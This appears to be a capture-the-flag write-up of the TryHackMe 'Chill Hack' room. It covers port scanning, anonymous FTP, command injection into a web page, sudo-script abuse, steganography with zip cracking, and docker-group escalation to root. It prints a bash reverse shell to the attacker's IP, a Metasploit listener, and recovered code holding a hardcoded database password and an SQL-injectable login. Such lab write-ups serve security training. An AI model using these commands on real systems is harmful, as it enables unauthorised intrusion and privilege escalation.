---
title: "TryHackMe - Chill Hack"
categories:
  - TryHackMe
tags:
  - linux
  - writeup
  - tryhackme
  - hacking
  - boot2root
---
This room provides the real world pentesting challenges.

## Scanning
First, i started scanning all ports with `rustscan` and nmap `aggressive` mode.
```bash
$ rustscan -a 10.10.245.173 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.245.173:21
Open 10.10.245.173:22
Open 10.10.245.173:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-13 07:38 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:38
Completed NSE at 07:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:38
Completed NSE at 07:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:38
Completed NSE at 07:38, 0.00s elapsed
Initiating Ping Scan at 07:38
Scanning 10.10.245.173 [2 ports]
Completed Ping Scan at 07:38, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 07:38
Completed Parallel DNS resolution of 1 host. at 07:39, 13.02s elapsed
DNS resolution of 1 IPs took 13.02s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 07:39
Scanning 10.10.245.173 [3 ports]
Discovered open port 80/tcp on 10.10.245.173
Discovered open port 22/tcp on 10.10.245.173
Discovered open port 21/tcp on 10.10.245.173
Completed Connect Scan at 07:39, 0.19s elapsed (3 total ports)
Initiating Service scan at 07:39
Scanning 3 services on 10.10.245.173
Completed Service scan at 07:39, 6.47s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.245.173.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:39
NSE: [ftp-bounce 10.10.245.173:21] PORT response: 500 Illegal PORT command.
Completed NSE at 07:39, 7.50s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:39
Completed NSE at 07:39, 1.57s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:39
Completed NSE at 07:39, 0.00s elapsed
Nmap scan report for 10.10.245.173
Host is up, received syn-ack (0.19s latency).
Scanned at 2021-01-13 07:38:58 EST for 29s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.25.205
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcxgJ3GDCJNTr2pG/lKpGexQ+zhCKUcUL0hjhsy6TLZsUE89P0ZmOoQrLQojvJD0RpfkUkDfd7ut4//Q0Gqzhbiak3AIOqEHVBIVcoINja1TIVq2v3mB6K2f+sZZXgYcpSQriwN+mKgIfrKYyoG7iLWZs92jsUEZVj7sHteOq9UNnyRN4+4FvDhI/8QoOQ19IMszrbpxQV3GQK44xyb9Fhf/Enzz6cSC4D9DHx+/Y1Ky+AFf0A9EIHk+FhU0nuxBdA3ceSTyu8ohV/ltE2SalQXROO70LMoCd5CQDx4o1JGYzny2SHWdKsOUUAkxkEIeEVXqa2pehJwqs0IEuC04sv
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFetPKgbta+pfgqdGTnzyD76mw/9vbSq3DqgpxPVGYlTKc5MI9PmPtkZ8SmvNvtoOp0uzqsfe71S47TXIIiQNxQ=
|   256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKHq62Lw0h1xzNV41zO3BsfpOiBI3uy0XHtt6TOMHBhZ
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 7EEEA719D1DF55D478C68D9886707F17
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

FTP with anonymous login allowed, SSH, and HTTP.

## Enumeration
Let's check the website at port 80 first.

<a href="/assets/images/tryhackme/chill-hack/1.png"><img src="/assets/images/tryhackme/chill-hack/1.png"></a>

Let's enumerate the website diretories with `gobuster`.
```bash
$ gobuster dir -u 10.10.245.173 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,jpg,html,css,jpeg,txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.245.173
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,jpg,html,css,jpeg
[+] Timeout:        10s
===============================================================
2021/01/13 07:43:07 Starting gobuster
===============================================================
/contact.html (Status: 200)
/contact.php (Status: 200)
/index.html (Status: 200)
/news.html (Status: 200)
/about.html (Status: 200)
/images (Status: 301)
/blog.html (Status: 200)
/css (Status: 301)
/team.html (Status: 200)
/style.css (Status: 200)
/js (Status: 301)
/fonts (Status: 301)
/secret (Status: 301)
```

Enumerate FTP via `anonymous` user.
```bash
$ ftp 10.10.245.173
Connected to 10.10.245.173.
220 (vsFTPd 3.0.3)
Name (10.10.245.173:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
226 Directory send OK.
ftp> mget *
mget note.txt? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (90 bytes).
226 Transfer complete.
90 bytes received in 0.00 secs (45.2578 kB/s)
```
- Note.txt:
    ```
    Anurodh told me that there is some filtering on strings being put in the command -- Apaar
    ```

`/secret` directory, interesting command execution.

<a href="/assets/images/tryhackme/chill-hack/2.png"><img src="/assets/images/tryhackme/chill-hack/2.png"></a>

I tried to inputting `ls` and here is the output.

<a href="/assets/images/tryhackme/chill-hack/3.png"><img src="/assets/images/tryhackme/chill-hack/3.png"></a>

After couple tries, i found this payload works for a reverse shell.
```bash
/bin/bash -c 'exec /bin/bash -i &>/dev/tcp/10.11.25.205/9999 <&1'
```

Here is my metasploit listener after injecting the payload:
```bash
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
payload => linux/x86/shell/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.11.25.205
LHOST => 10.11.25.205
msf6 exploit(multi/handler) > set LPORT 9999
LPORT => 9999
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.11.25.205:9999 
[*] Sending stage (36 bytes) to 10.10.245.173
[*] Command shell session 1 opened (10.11.25.205:9999 -> 10.10.245.173:59010) at 2021-01-13 08:10:39 -0500

bash: no job control in this shell
<$ i{mages,ndex.php} Yj?XIy�jX�Rh//shh/bin��RS��whoami        �j 

www-data@ubuntu:/var/www/html/secret$ 
```

## Escalation
Checking sudo privileges.
```bash
www-data@ubuntu:/var/www/files$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

`.helpline.sh` content:
```bash
www-data@ubuntu:/var/www/files$ cat  /home/apaar/.helpline.sh
cat  /home/apaar/.helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
www-data@ubuntu:/var/www/files$ ls -l  /home/apaar/.helpline.sh
ls -l  /home/apaar/.helpline.sh
-rwxrwxr-x 1 apaar apaar 286 Oct  4 14:11 /home/apaar/.helpline.sh
```

It will run our input with this syntax `$msg 2>/dev/null`. We can change our user to `apaar` by running `bash`.
```
$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

bash
bash
whoami
apaar
```

user flag:
```bash
$ cd ~
$ ls
local.txt
$ cat local.txt
{USER-FLAG: REDACTED}
```

I found interesting files / directory at `/files` before, let's download all the files.

<a href="/assets/images/tryhackme/chill-hack/4.png"><img src="/assets/images/tryhackme/chill-hack/4.png"></a>

- Hacker.php:
  ```php
  <html>
  <head>
  <body>
  <style>
  body {
    background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
  }
  h2
  {
    color:red;
    font-weight: bold;
  }
  h1
  {
    color: yellow;
    font-weight: bold;
  }
  </style>
  <center>
    <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
    <h1 style="background-color:red;">You have reached this far. </h2>
    <h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
  </center>
  </head>
  </html>
  ```
- account.php:
  ```php
  <?php

  class Account
  {
    public function __construct($con)
    {
      $this->con = $con;
    }
    public function login($un,$pw)
    {
      $pw = hash("md5",$pw);
      $query = $this->con->prepare("SELECT * FROM users WHERE username='$un' AND password='$pw'");
      $query->execute();
      if($query->rowCount() >= 1)
      {
        return true;
      }?>
      <h1 style="color:red";>Invalid username or password</h1>
    <?php }
  }

  ?>
  ```
- index.php:
  ```php
  <html>
  <body>
  <?php
    if(isset($_POST['submit']))
    {
      $username = $_POST['username'];
      $password = $_POST['password'];
      ob_start();
      session_start();
      try
      {
        $con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
        $con->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);
      }
      catch(PDOException $e)
      {
        exit("Connection failed ". $e->getMessage());
      }
      require_once("account.php");
      $account = new Account($con);
      $success = $account->login($username,$password);
      if($success)
      {
        header("Location: hacker.php");
      }
    }
  ?>
  <link rel="stylesheet" type="text/css" href="style.css">
    <div class="signInContainer">
      <div class="column">
        <div class="header">
          <h2 style="color:blue;">Customer Portal</h2>
          <h3 style="color:green;">Log In<h3>
        </div>
        <form method="POST">
          <?php echo $success?>
                      <input type="text" name="username" id="username" placeholder="Username" required>
          <input type="password" name="password" id="password" placeholder="Password" required>
          <input type="submit" name="submit" value="Submit">
              </form>
      </div>
    </div>
  </body>
  </html>
  ```

There is a clue there. `Look in the dark! You will find your answer`. I believe we should use steganography for this? Alright, let's extract the `hidden` thingy in the `/images/` directory.
```bash
$ steghide extract -sf hacker-with-laptop_23-2147985341.jpg 
Enter passphrase: 
wrote extracted data to "backup.zip".
```

- backup.zip:

  <a href="/assets/images/tryhackme/chill-hack/5.png"><img src="/assets/images/tryhackme/chill-hack/5.png"></a>

Let's bruteforce the zip password.
```bash
$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip

PASSWORD FOUND!!!!: pw == pass1word
```

`source_code.php` inside zip:
```php
<html>
<head>
	Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" name="name" placeholder="username"><br><br>
			Email: <input type="email" name="email" placeholder="email"><br><br>
			Password: <input type="password" name="password" placeholder="password">
                        <input type="submit" name="submit" value="Submit"> 
		</form>
<?php
        if(isset($_POST['submit']))
	{
		$email = $_POST["email"];
		$password = $_POST["password"];
		if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
		{ 
			$random = rand(1000,9999);?><br><br><br>
			<form method="POST">
				Enter the OTP: <input type="number" name="otp">
				<input type="submit" name="submitOtp" value="Submit">
			</form>
		<?php	mail($email,"OTP for authentication",$random);
			if(isset($_POST["submitOtp"]))
				{
					$otp = $_POST["otp"];
					if($otp == $random)
					{
						echo "Welcome Anurodh!";
						header("Location: authenticated.php");
					}
					else
					{
						echo "Invalid OTP";
					}
				}
 		}
		else
		{
			echo "Invalid Username or Password";
		}
        }
?>
</html>
```

`anurodh` password there, let's decode it.
```bash
$ echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d
!d0ntKn0wmYp@ssw0rd
```

`su anurodh`!
```bash
apaar@ubuntu:/var/www/html/secret$ su anurodh
su anurodh
Password: !d0ntKn0wmYp@ssw0rd

anurodh@ubuntu:/var/www/html/secret$
```

Checking `id`:
```bash
anurodh@ubuntu:~$ id
id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```

Since `anurodh` is member from `docker` group, we can abuse it.
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
w#whoami
whoami
root
```

root.txt:
```bash
# cd /root
cd /root
# ls
ls
proof.txt
# cat proof.txt
cat proof.txt


                                        {ROOT-FLAG: REDACTED}


Congratulations! You have successfully completed the challenge.


         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \ 
|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
 \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
 | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'  
  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     / 
  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``  


--------------------------------------------Designed By -------------------------------------------------------
                                        |  Anurodh Acharya |
                                        ---------------------

                                     Let me know if you liked it.

Twitter
        - @acharya_anurodh
Linkedin
        - www.linkedin.com/in/anurodh-acharya-b1937116a
```